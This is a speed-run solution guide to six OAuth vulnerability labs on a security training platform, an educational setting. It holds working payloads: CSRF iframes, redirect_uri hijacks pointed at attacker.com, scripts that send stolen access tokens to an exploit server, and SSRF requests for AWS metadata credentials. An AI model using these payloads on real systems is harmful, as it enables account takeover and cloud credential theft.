# OAuth Authentication - Quick-Start Guide

**Time to Complete All 6 Labs: 60 minutes**

## Lab Speed Reference

| Lab | Time | Difficulty | Key Technique |
|-----|------|------------|---------------|
| 1 - Implicit Flow Bypass | 5 min | Apprentice | Parameter manipulation |
| 2 - Forced Profile Linking | 10 min | Apprentice | CSRF via missing state |
| 3 - redirect_uri Hijacking | 5 min | Apprentice | redirect_uri validation bypass |
| 4 - Proxy Page Token Theft | 15 min | Practitioner | Directory traversal + postMessage |
| 5 - Open Redirect Token Theft | 15 min | Practitioner | Chained vulnerabilities |
| 6 - SSRF Client Registration | 10 min | Practitioner | OpenID dynamic registration SSRF |

---

## 5-Minute OAuth Vulnerability Check

### Quick Win Checklist

**1. Missing state Parameter (2 minutes)**
```http
# Check authorization request
GET /auth?client_id=...&redirect_uri=...&response_type=code

# If no &state= parameter → CSRF vulnerability!
```

**2. redirect_uri Validation (2 minutes)**
```http
# Test in Burp Repeater
GET /auth?...&redirect_uri=https://attacker.com

# If redirect works → Critical vulnerability
```

**3. Implicit Flow Misuse (1 minute)**
```http
# Check for tokens in URL
https://app.com/callback#access_token=...

# If present → Prefer authorization code flow
```

---

## Lab 1: Implicit Flow Bypass (5 minutes)

### Instant Solution

**Step 1: Login** (30 seconds)
- Click "My account" → Use OAuth
- Login as `wiener:peter`

**Step 2: Find Authentication Request** (2 minutes)
- Burp Proxy → HTTP history
- Find `POST /authenticate` with JSON body

**Step 3: Exploit** (2 minutes)
```http
# Send to Repeater, modify email:
POST /authenticate HTTP/1.1
Content-Type: application/json

{"email":"carlos@carlos-montoya.net","username":"wiener","token":"YOUR_TOKEN"}
```

**Step 4: Access Account** (30 seconds)
- Right-click → "Request in browser" → "In original session"
- Paste URL in browser → Logged in as Carlos ✅

### One-Liner
```
Burp Proxy → Find POST /authenticate → Repeater → Change email to carlos@carlos-montoya.net → Request in browser
```

---

## Lab 2: Forced Profile Linking (10 minutes)

### Speed-Run Steps

**Phase 1: Setup** (3 minutes)
1. Login as `wiener:peter`
2. Attach social profile (credentials: `peter.wiener:hotdog`)
3. Verify OAuth login works

**Phase 2: Capture Code** (3 minutes)
1. Burp Intercept ON
2. Click "Attach social profile" again
3. Intercept `GET /oauth-linking?code=...`
4. **Copy the code parameter**
5. **Drop the request** (keeps code valid)
6. Intercept OFF, logout

**Phase 3: Exploit** (4 minutes)
1. Exploit server → Body:
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN_CODE"></iframe>
```
2. Store → Deliver to victim
3. Login via OAuth → You're admin
4. Admin panel → Delete carlos ✅

### Critical Actions
- ✅ DROP intercepted request (don't let it complete)
- ✅ Copy FULL URL with code parameter
- ✅ Logout before delivering exploit

---

## Lab 3: redirect_uri Hijacking (5 minutes)

### Lightning Solution

**Step 1: Test Validation** (2 minutes)
```http
# Burp Repeater
GET /auth?client_id=YOUR-CLIENT&redirect_uri=https://exploit-YOUR-EXPLOIT.exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
```
If it redirects to your server → Vulnerable ✅

**Step 2: Create Exploit** (1 minute)
```html
<iframe src="https://oauth-YOUR-OAUTH.oauth-server.net/auth?client_id=YOUR-CLIENT&redirect_uri=https://exploit-YOUR-EXPLOIT.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

**Step 3: Capture & Use Code** (2 minutes)
1. Store → Deliver exploit
2. Access logs → Copy code from `/?code=...`
3. Navigate to:
```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN_CODE
```
4. Admin panel → Delete carlos ✅

### Speed Tip
```
Test redirect_uri in Repeater → Create iframe → Deliver → Grab code from logs → Use code in browser
```

---

## Lab 4: Proxy Page Token Theft (15 minutes)

### Efficient Workflow

**Phase 1: Test Directory Traversal** (5 minutes)
```http
# Burp Repeater
GET /auth?...&redirect_uri=https://LAB.net/oauth-callback/../post/comment/comment-form&response_type=token
```
Should redirect to comment form with token in fragment ✅

**Phase 2: Build Exploit** (5 minutes)
```html
<iframe src="https://oauth-SERVER.net/auth?client_id=ID&redirect_uri=https://LAB.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=123&scope=openid%20profile%20email"></iframe>

<script>
window.addEventListener('message', function(e) {
    fetch("/?stolen=" + encodeURIComponent(e.data.data))
}, false)
</script>
```

**Phase 3: Extract & Use Token** (5 minutes)
1. Store → Deliver exploit
2. Access logs → Find `/?stolen=...` entry
3. URL decode → Extract `access_token=TOKEN_VALUE`
4. Burp Repeater:
```http
GET /me HTTP/1.1
Host: oauth-SERVER.net
Authorization: Bearer TOKEN_VALUE
```
5. Copy apikey → Submit solution ✅

### Time-Saver
```
Pre-write exploit → Just update URLs → Deliver → Decode logs → Extract token → Use on /me endpoint
```

---

## Lab 5: Open Redirect Token Theft (15 minutes)

### Optimized Approach

**Phase 1: Discover Vulnerabilities** (5 minutes)

**Test 1: Directory Traversal**
```http
GET /auth?...&redirect_uri=https://LAB.net/oauth-callback/../&response_type=token
```

**Test 2: Open Redirect**
```http
GET /post/next?path=https://exploit-SERVER.net
# Should redirect to your domain
```

**Phase 2: Chain Attack** (5 minutes)

**Exploit Page at `/exploit`:**
```html
<script>
if (window.location.hash) {
    window.location = '/?stolen=' + window.location.hash.substring(1);
}
</script>
```

**Main Exploit (iframe):**
```html
<iframe src="https://oauth.net/auth?client_id=ID&redirect_uri=https://LAB.net/oauth-callback/../post/next?path=https://EXPLOIT.net/exploit&response_type=token&nonce=123&scope=openid%20profile%20email"></iframe>
```

**Phase 3: Token Extraction** (5 minutes)
1. Store both pages
2. Deliver exploit
3. Access logs → `/?stolen=access_token%3D...`
4. URL decode → Extract token
5. Use on `/me` endpoint → Get apikey ✅

### Pro Tip
```
Create two exploit pages: /exploit (JavaScript extractor) + main page (iframe trigger)
```

---

## Lab 6: SSRF Client Registration (10 minutes)

### Fast Track

**Step 1: Discover Registration** (2 minutes)
```http
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-YOUR-OAUTH.oauth-server.net

# Look for "registration_endpoint"
```

**Step 2: Test Registration** (2 minutes)
```http
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH.oauth-server.net
Content-Type: application/json

{"redirect_uris":["https://example.com"]}

# Returns client_id → Registration works
```

**Step 3: SSRF Attack** (3 minutes)
```http
POST /reg HTTP/1.1
Content-Type: application/json

{"redirect_uris":["https://example.com"],"logo_uri":"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"}

# Copy returned client_id
```

**Step 4: Extract Credentials** (3 minutes)
```http
GET /client/CLIENT-ID-FROM-STEP-3/logo HTTP/1.1

# Response contains AWS credentials
# Copy SecretAccessKey value → Submit solution ✅
```

### Speed Commands
```bash
# All in Burp Repeater:
1. GET /.well-known/openid-configuration
2. POST /reg with {"redirect_uris":["https://x.com"]}
3. POST /reg with logo_uri → AWS metadata
4. GET /client/ID/logo → Extract secret
```

---

## Emergency Cheat Sheet

### Common OAuth Endpoints

```
# OpenID Discovery
GET /.well-known/openid-configuration

# Authorization
GET /auth?client_id=ID&redirect_uri=URI&response_type=code&scope=openid

# Token Exchange (Code Flow)
POST /token
code=AUTH_CODE&client_id=ID&client_secret=SECRET&redirect_uri=URI

# User Info
GET /userinfo
Authorization: Bearer ACCESS_TOKEN

# Alternative User Endpoint
GET /me
Authorization: Bearer ACCESS_TOKEN

# Client Registration (OpenID)
POST /reg
Content-Type: application/json
{"redirect_uris":["https://example.com"]}
```

### Burp Suite Shortcuts

```
# Send to Repeater
Ctrl/Cmd + R

# Send to Intruder
Ctrl/Cmd + I

# URL Decode
Ctrl/Cmd + Shift + U

# Base64 Decode
Burp Decoder → Select text → Smart decode

# Request in Browser
Right-click request → Request in browser → In original session
```

### Parameter Manipulation Quick Tests

```http
# Test 1: redirect_uri bypass
&redirect_uri=https://attacker.com

# Test 2: Directory traversal
&redirect_uri=https://victim.com/callback/../evil

# Test 3: Open redirect chain
&redirect_uri=https://victim.com/redirect?url=https://attacker.com

# Test 4: Remove state parameter
DELETE &state=... from authorization request

# Test 5: Scope escalation
&scope=admin+delete_users

# Test 6: Email manipulation
{"email":"victim@example.com","token":"attacker_token"}
```

### Token Extraction Patterns

**Pattern 1: postMessage Leak**
```javascript
window.addEventListener('message', function(e) {
    fetch("/?leak=" + encodeURIComponent(e.data.data))
})
```

**Pattern 2: URL Fragment Extraction**
```javascript
if (window.location.hash) {
    window.location = '/?token=' + window.location.hash.substring(1)
}
```

**Pattern 3: Iframe Trigger**
```html
<iframe src="OAUTH_AUTHORIZATION_URL_HERE"></iframe>
```

### AWS Metadata SSRF Targets

```bash
# IAM Role List
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IAM Credentials (replace ROLE with actual role name)
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role/

# Instance Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data
```

### One-Liner Solutions

**Lab 1:**
```
POST /authenticate → Change email to carlos@carlos-montoya.net → Request in browser
```

**Lab 2:**
```
Intercept /oauth-linking?code=X → Drop → Create <iframe src="...?code=X"> → Deliver → Login via OAuth
```

**Lab 3:**
```
Test redirect_uri=exploit-server → Create iframe → Deliver → Use stolen code in /oauth-callback?code=X
```

**Lab 4:**
```
redirect_uri=.../callback/../comment-form → postMessage listener → Deliver → Decode logs → Use token on /me
```

**Lab 5:**
```
redirect_uri=.../callback/../post/next?path=exploit.net → Fragment extractor JS → Deliver → Use token
```

**Lab 6:**
```
POST /reg → logo_uri=169.254.169.254/meta-data/iam/... → GET /client/ID/logo → Extract SecretAccessKey
```

---

## Troubleshooting Guide

### Problem: Authorization Code Expired

**Symptoms**: "Invalid code" or "Code already used"

**Solutions**:
- Codes expire in 60-300 seconds - work quickly
- For Lab 2/3: Deliver exploit again to get fresh code
- For Lab 2: Ensure you DROP intercepted request (don't complete it)
- Don't test codes before final use (single-use only)

### Problem: redirect_uri Not Accepted

**Symptoms**: "Invalid redirect_uri" error

**Solutions**:
- Check exact URL format (https://, trailing slashes)
- Ensure URL is properly encoded
- Test in Burp Repeater first
- Try variations: with/without trailing slash

### Problem: postMessage Not Received

**Symptoms**: No token in access logs (Lab 4)

**Solutions**:
- Check browser console for JavaScript errors
- Verify iframe loads successfully
- Ensure `addEventListener` is set up before iframe loads
- Test with console.log() before fetch()
- Check that postMessage uses wildcard origin (*)

### Problem: Token Not Found in Logs

**Symptoms**: Access logs don't show stolen parameter

**Solutions**:
- Verify victim has active OAuth session
- Check that JavaScript executes (no errors)
- Ensure fetch() completes (check Network tab)
- Try delivering exploit multiple times
- Refresh access log page

### Problem: Invalid Token

**Symptoms**: 401 Unauthorized on /me endpoint

**Solutions**:
- Tokens expire (typically 3600 seconds)
- Ensure you extracted complete token value
- Remove URL encoding artifacts (%3D → =, %26 → &)
- Verify Authorization header format: `Bearer TOKEN` (note space)
- Check for trailing whitespace or newlines

### Problem: Client Registration Fails

**Symptoms**: 400 Bad Request on POST /reg

**Solutions**:
- Verify Content-Type: application/json header
- Check JSON syntax (no trailing commas)
- Ensure redirect_uris is an array: `["https://x.com"]`
- Some servers require additional fields
- Check error message for required fields

### Problem: SSRF Doesn't Work

**Symptoms**: Logo endpoint returns 404 or error

**Solutions**:
- OAuth server must be on AWS EC2 for metadata access
- Use HTTP (not HTTPS) for 169.254.169.254
- Try listing roles first: `.../iam/security-credentials/`
- Role name may differ ("admin", "ec2-role", "default")
- Server may filter private IPs

---

## Productivity Tips

### Burp Suite Optimization

**1. Organize HTTP History**
```
Proxy → HTTP history → Right-click → Add comment
Label important requests: "Auth request", "Token exchange", "User info"
```

**2. Use Repeater Tabs**
```
Create separate tabs for each test:
- Tab 1: Authorization request
- Tab 2: Token exchange
- Tab 3: User info (/me)
- Tab 4: Client registration
```

**3. Save Requests**
```
Right-click request → Save item
Build a library of common OAuth requests
```

**4. Keyboard Shortcuts**
```
Ctrl+R: Send to Repeater (faster than right-click)
Ctrl+Space: Forward intercepted request
Ctrl+Z: Undo changes in request editor
```

### Lab Automation Scripts

**Extract Authorization Code from Logs:**
```bash
# In exploit server access logs
grep "code=" logs.txt | cut -d'=' -f2 | cut -d' ' -f1
```

**URL Decode Token:**
```python
import urllib.parse
encoded = "access_token%3DTOKEN%26expires_in%3D3600"
decoded = urllib.parse.unquote(encoded)
print(decoded.split('&')[0].split('=')[1])  # Extracts token value
```

**Quick OAuth Request Generator:**
```python
base_url = "https://oauth-server.net/auth"
params = {
    "client_id": "YOUR-CLIENT-ID",
    "redirect_uri": "https://attacker.com",
    "response_type": "code",
    "scope": "openid profile email"
}
url = f"{base_url}?{'&'.join(f'{k}={v}' for k,v in params.items())}"
print(url)
```

### Time Management

**60-Minute Full Completion Plan:**
- Lab 1: Minutes 0-5 (Warm-up, easy win)
- Lab 3: Minutes 5-10 (Quick redirect_uri test)
- Lab 6: Minutes 10-20 (SSRF practice)
- Lab 2: Minutes 20-30 (CSRF technique)
- Lab 4: Minutes 30-45 (Complex chain)
- Lab 5: Minutes 45-60 (Final challenge)

**Break Points:**
- After Lab 1: Verify you understand parameter manipulation
- After Lab 3: Confirm redirect_uri testing technique
- After Lab 6: Practice SSRF methodology
- After Lab 2: Master CSRF exploitation

---

## Pre-Lab Setup

### Burp Suite Configuration

**1. Enable Intercept**
```
Proxy → Intercept → Intercept is on (toggle as needed)
```

**2. Configure Target Scope**
```
Target → Scope → Add → *.web-security-academy.net
Target → Scope → Add → *.oauth-server.net
```

**3. HTTP History Filter**
```
Proxy → HTTP history → Filter → Show only in-scope items
```

**4. Collaborator Setup** (for Lab 6)
```
Burp → Burp Collaborator client → Copy subdomain
Keep window open to check for interactions
```

### Browser Setup

**1. Proxy Configuration**
```
Browser → Settings → Network → Manual proxy
HTTP Proxy: 127.0.0.1
Port: 8080
```

**2. Certificate Installation**
```
Visit: http://burp
Download CA Certificate
Install in browser trusted certificates
```

**3. Disable Caching**
```
Developer Tools → Network → Disable cache
Prevents stale OAuth responses
```

---

## Post-Lab Review

### Key Concepts Mastered

✅ **OAuth 2.0 Flows**
- Authorization code flow
- Implicit flow (and why it's insecure)
- Token exchange process

✅ **Vulnerability Types**
- Client-side validation bypass
- CSRF (missing state parameter)
- redirect_uri validation flaws
- Token leakage via URL fragments
- SSRF via client registration

✅ **Attack Techniques**
- Parameter manipulation
- Request interception and dropping
- Exploit chaining (directory traversal + open redirect)
- postMessage exploitation
- AWS metadata SSRF

✅ **Burp Suite Skills**
- Proxy interception
- Repeater testing
- Exploit server usage
- Access log analysis
- Request modification

### Next Steps

**1. Advanced OAuth Practice**
- Try labs with different variations
- Test against bug bounty programs (with permission)
- Set up local OAuth server for testing

**2. Study OAuth 2.1 and PKCE**
- Learn modern OAuth security extensions
- Understand PKCE implementation
- Review OAuth 2.1 draft specification

**3. Explore Related Vulnerabilities**
- OpenID Connect security
- JWT token manipulation
- SAML authentication attacks
- Session management flaws

**4. Real-World Testing**
- Review OAuth implementations in web apps
- Analyze mobile app OAuth flows
- Test API authentication mechanisms

### Certification Preparation

**Relevant Certifications:**
- OSWE (Offensive Security Web Expert)
- OSCP (OAuth testing in web apps)
- GWAPT (GIAC Web Application Penetration Tester)
- eWPT (eLearnSecurity Web Penetration Tester)

**Skills Demonstrated:**
- Web application security testing
- Authentication and authorization testing
- Burp Suite proficiency
- Exploit development
- Security vulnerability analysis

---

## Quick Reference Card

**Print this page for instant reference during labs!**

### Lab Order by Speed
1. Lab 1 (5 min) - Easiest
2. Lab 3 (5 min) - redirect_uri test
3. Lab 6 (10 min) - SSRF basics
4. Lab 2 (10 min) - CSRF
5. Lab 4 (15 min) - Chaining
6. Lab 5 (15 min) - Most complex

### Critical Success Factors
- **Lab 1**: Change email, not token
- **Lab 2**: DROP intercepted request
- **Lab 3**: Test redirect_uri in Repeater first
- **Lab 4**: Use addEventListener before iframe
- **Lab 5**: Create two exploit pages
- **Lab 6**: Use HTTP for AWS metadata

### Common URLs
```
/.well-known/openid-configuration
/auth?client_id=...
/oauth-callback
/oauth-linking
/token
/me or /userinfo
/reg (client registration)
/client/ID/logo
```

### Essential Headers
```
Content-Type: application/json
Authorization: Bearer TOKEN
```

### Must-Remember Parameters
```
client_id=...
redirect_uri=...
response_type=code (or token)
scope=openid profile email
state=RANDOM (CSRF protection)
nonce=RANDOM (replay protection)
```

**Good luck! Master OAuth security in under 60 minutes! 🚀**
